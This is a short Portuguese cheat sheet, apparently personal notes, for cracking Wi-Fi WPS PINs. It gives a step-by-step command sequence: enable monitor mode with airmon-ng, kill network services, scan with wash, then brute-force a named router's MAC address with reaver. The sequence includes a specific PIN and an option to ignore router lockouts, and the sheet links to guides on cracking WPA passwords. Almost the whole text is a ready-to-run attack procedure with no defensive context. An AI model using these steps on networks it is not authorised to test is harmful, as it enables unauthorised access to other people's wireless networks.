    ## WPS ##

## Ver a interface de rede sem fio (Neste caso é wlan0)
ifconfig
iwconfig
airmon-ng

## Iniciar a interface (wlan0) em modo monitor (para ser possível capturar todo pacotes
    # Irá criar uma "nova" interface em modo monitor, neste caso wlan0mon
airmon-ng start wlan0


## Termine todo programas secundário que pode atrapalhar na captura
    # Por exemplo NetworkManager e wpa_supplicant
        # killall NetworkManager
        # killall wpa_supplicant

    ## Pelo airmon-ng
airmon-ng check kill

## walsh verifica os rede com WPS ativado
walsh -i wlan0mon

## Depois desse porcesso deverá escolhar a rede alvo
    # -i interface -c chanal -b MAC address -vv verbose
reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -vv

    # -p PIN envia o específico PIN para teste
reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -p 19018324  -vv

    # --ignore-locks ignora lock do roteador, que pode ainda estar respondendo aos PIN enviados
reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -p 19018324  -vv --ignore-locks

## Good links
http://null-byte.wonderhowto.com/how-to/hack-wpa-wifi-passwords-by-cracking-wps-pin-0132542/
http://www.wirelessdomination.com/how-to-crack-wpa2-wifi-password-using-reaver-wpa2/
